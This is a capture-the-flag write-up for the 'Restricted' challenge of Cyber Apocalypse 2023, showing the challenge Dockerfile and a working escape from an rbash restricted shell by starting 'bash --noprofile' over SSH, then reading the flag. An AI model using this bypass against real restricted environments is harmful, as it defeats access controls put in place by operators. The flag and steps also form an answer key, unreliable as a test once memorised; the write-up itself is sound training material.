# Cyber Apocalypse 2023

## Restricted

> You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?
>
>  Author: N/A
>
> [`misc_restricted.zip`](misc_restricted.zip)

Tags: _misc_

## Solution
When connecting to the container we get:
```
$ nc 139.59.173.68 30569
SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
test
Invalid SSH identification string.
```

So what going on. Luckily we have the Dockerfile so let's have a look:
```
FROM debian:latest

RUN apt update -y && apt upgrade -y && apt install openssh-server procps -y

RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted
RUN sed -i -re 's/^restricted:[^:]+:/restricted::/' /etc/passwd /etc/shadow

RUN mkdir /home/restricted/.bin
RUN chown -R restricted:restricted /home/restricted

RUN ln -s /usr/bin/top /home/restricted/.bin
RUN ln -s /usr/bin/uptime /home/restricted/.bin
RUN ln -s /usr/bin/ssh /home/restricted/.bin

COPY src/sshd_config /etc/ssh/sshd_config
COPY src/flag.txt /flag.txt
COPY src/bash_profile /home/restricted/.bash_profile

RUN chown root:root /home/restricted/.bash_profile
RUN chmod 755 /home/restricted/.bash_profile
RUN chmod 755 /flag.txt

RUN mv /flag.txt /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

RUN ssh-keygen -A
RUN mkdir -p /run/sshd

EXPOSE 1337

ENTRYPOINT ["/usr/sbin/sshd", "-D", "-o", "ListenAddress=0.0.0.0", "-p", "1337"]
```

It's basically providing us with a restricted shell (rbash) but we also have a user `restricted` that can login without password.

```
$ ssh restricted@139.59.173.68 -p 30569
The authenticity of host '[139.59.173.68]:30569 ([139.59.173.68]:30569)' can't be established.
ED25519 key fingerprint is SHA256:cAQBhvlkikmVEqxHI4pvLx+e6a/azX7qRP0kSv+2Wak.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:141: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[139.59.173.68]:30569' (ED25519) to the list of known hosts.
Linux ng-restricted-luc8q-6759695bd5-56q8j 5.18.0-0.deb11.4-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$ ls
-rbash: ls: command not found
restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$ pwd
/home/restricted
restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$
```

So yes, we are in. But there is not much that can be done. We have a couple of basic commands but thats about it. One thing we can do is to start the remote shall without loading the rc profile to get the flag.

```
$ ssh restricted@139.59.173.68 -p 30569 -t "bash --noprofile"
restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$ cd /
restricted@ng-restricted-luc8q-6759695bd5-56q8j:/$ ls
bin  boot  dev  etc  flag_8dpsy  home  lib  lib64  media  memories.dump  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
restricted@ng-restricted-luc8q-6759695bd5-56q8j:/$ cat flag_8dpsy
HTB{r35tr1ct10n5_4r3_p0w3r1355}
```